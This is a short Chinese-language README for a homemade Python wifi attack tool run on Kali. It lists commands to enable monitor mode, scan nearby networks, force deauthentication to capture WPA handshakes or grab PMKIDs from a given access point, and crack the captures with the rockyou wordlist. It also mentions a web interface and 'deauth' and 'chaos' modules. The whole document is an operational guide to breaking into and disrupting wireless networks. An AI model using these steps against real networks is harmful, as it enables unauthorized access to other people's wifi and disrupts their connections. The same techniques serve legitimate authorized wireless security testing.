# README

一个手搓的小玩具。



## 使用流程

前情提要：放在kali上运行，windows上没有自带工具。记得插上无线网卡。



1.查看网卡相关信息

```
python wifitool.py iface -h
python wifitool.py iface list
python wifitool.py iface monitor start wlan0
```



2.扫描附近无线网络

```
python wifitool.py scan wlan0
```



3.使用capture deauth抓取握手包或者使用PMKID方法

```
python wifitool.py capture 5C:27:D4:E7:4E:46 wlan0 --channel 6 --deauth
python wifitool.py pmkid 5C:27:D4:E7:4E:46 wlan0 --channel 6
```



4.第三步获取的所有包都可以直接使用crack拿去爆破

```
python wifitool.py crack /tmp/WifiHackingTool-cap-nhv65dtw/cap-01.cap --wordlist /usr/share/wordlists/rockyou.txt --bssid 5C:27:D4:E7:4E:46 
```



5.也可以直接打开 web 端做点鼠标的猴子

```
python wifitool.py web
```



## 项目结构

```
wifitool.py          CLI 入口（命令不变：python wifitool.py ...）
wifi_core/           核心功能：scan / capture / pmkid / crack / deauth / chaos
wifi_infra/          基础设施：iface / runner / parse / render / errors / utils / adapters / tasks
wifi_web/            Web 服务 webapp.py 与其 static/
```



